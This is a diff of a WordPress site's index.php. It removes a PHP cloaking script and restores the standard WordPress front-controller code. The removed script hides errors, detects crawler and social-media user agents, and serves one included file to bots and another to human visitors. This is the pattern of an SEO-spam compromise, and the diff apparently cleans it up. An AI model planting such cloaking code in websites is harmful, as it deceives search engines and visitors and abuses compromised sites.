@@ -1,33 +1,17 @@
-<?php  
-error_reporting(0);
-set_time_limit(0);
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
 
-$bot_content_file = 'file.php';
-$user_content_file = 'home.php';
-function is_spider()
-{
-    $spiders = ['Googlebot', 'Google-InspectionTool', 'Google Favicon', 'Google-Site-Verification', 'facebook', 'instagram', 'tiktok', 'telegram', 'bot'];
-    $s_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
-    
-    foreach ($spiders as $spider) {
-        if (stripos($s_agent, $spider) !== false) {
-            return true;
-        }
-    }
-    return false;
-}
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
 
-if (is_spider()) {	
-    if (file_exists($bot_content_file)) {
-        include($bot_content_file);
-    }	
-    exit();
-}else{	
-    if (file_exists($user_content_file)) {
-        include($user_content_file);
-    }	
-    exit();
-}
-
-
-?>
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
